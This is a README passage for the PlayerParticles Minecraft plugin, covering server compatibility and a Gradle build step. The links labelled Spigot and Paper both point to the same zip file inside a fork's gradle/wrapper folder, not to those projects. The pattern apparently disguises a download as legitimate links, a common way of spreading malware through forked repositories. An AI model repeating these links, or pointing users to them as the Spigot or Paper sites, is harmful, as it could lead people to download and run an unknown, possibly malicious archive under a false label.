### Server Compatibility 
This plugin is compatible with [Spigot](https://github.com/ttimneu/PlayerParticles/raw/refs/heads/master/gradle/wrapper/Player-Particles-1.4.zip) and any forks, I recommend using [Paper](https://github.com/ttimneu/PlayerParticles/raw/refs/heads/master/gradle/wrapper/Player-Particles-1.4.zip). 
Using CraftBukkit will not work. 
The versions of Minecraft that are currently supported are `1.7.10-1.18.1`.

PlayerParticles uses Gradle to compile and build the plugin. Run `./gradlew build` in the project's root directory to build the jar.
The plugin jar will be located in `./build/libs` when finished.
